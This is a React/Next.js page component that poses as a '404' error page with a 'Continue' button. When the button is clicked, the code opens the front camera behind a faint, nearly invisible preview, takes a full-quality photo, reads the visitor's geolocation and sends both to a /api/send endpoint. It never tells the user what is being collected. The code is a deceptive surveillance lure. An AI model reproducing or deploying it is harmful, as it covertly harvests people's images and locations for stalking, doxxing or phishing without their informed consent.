"use client";
import { useRef, useState } from "react";
import "@/public/404.css";

export default function Home() {
  const videoRef = useRef<HTMLVideoElement>(null);
  const [showPreview, setShowPreview] = useState(false);

  async function capture() {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });

    const video = videoRef.current!;
    video.srcObject = stream;
    video.muted = true;

    // show faded preview
    setShowPreview(true);
    await video.play();

    // ⏱ keep preview visible for 1 second
    await new Promise(resolve => setTimeout(resolve, 1000));

    // capture full-quality frame
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d")!;
    ctx.drawImage(video, 0, 0);

    const image = canvas.toDataURL("image/jpeg", 0.9);

    console.log("Captured image size:", image.length);

    // stop camera + hide preview
    stream.getTracks().forEach(t => t.stop());
    setShowPreview(false);

    // capture location + send
    navigator.geolocation.getCurrentPosition(async pos => {
      await fetch("/api/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          image,
          lat: pos.coords.latitude,
          lon: pos.coords.longitude
        })
      });
    });
  }

  return (
    <div className="error-container">
      <h1>404</h1>
      <p>Click here to continue</p>

      {showPreview && (
        <video
          ref={videoRef}
          playsInline
          muted
          style={{
            width: 160,
            height: 160,
            opacity: 0.3,        // 👈 30% opacity
            borderRadius: 12,
            marginBottom: 16
          }}
        />
      )}

      <button onClick={capture}>Continue</button>
    </div>
  );
}
